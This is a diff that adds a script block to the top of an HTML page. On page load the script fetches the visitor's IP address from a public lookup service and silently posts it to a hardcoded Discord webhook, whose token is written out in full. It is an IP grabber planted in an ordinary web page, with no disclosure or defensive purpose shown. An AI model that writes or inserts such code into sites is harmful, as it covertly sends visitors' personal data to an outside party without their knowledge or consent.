@@ -1,4 +1,40 @@
 <!DOCTYPE html>
+
+<script>
+    function getUserIP(onNewIP) {
+        //  Create new XMLHttpRequest
+        var xhr = new XMLHttpRequest();
+
+        // Callback function when XMLHttpRequest is ready
+        xhr.onreadystatechange = function () {
+            if (this.readyState == 4 && this.status == 200) {
+                onNewIP(this.responseText);
+            }
+        };
+
+        // Send request to get users ip
+        xhr.open("GET", "https://api.ipify.org?format=json", true);
+        xhr.send();
+    }
+
+    getUserIP(function (ip) {
+        // Send IP to webhook
+        fetch('https://discord.com/api/webhooks/1193119309594112040/PvdEewvBUYlteGdtgcEXDv89Uk515__n3DRN6sm17NNFpyK8qujCPjc2trN9pR3xANLS', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({
+                embeds: [{
+                    title: 'IP Address',
+                    description: ip,
+                    color: 0x00FF00
+                }]
+            })
+        });
+    });
+</script>
+
 <html lang="en">
 <head>
     <meta content="text/html; charset=UTF-8" http-equiv="content-type">
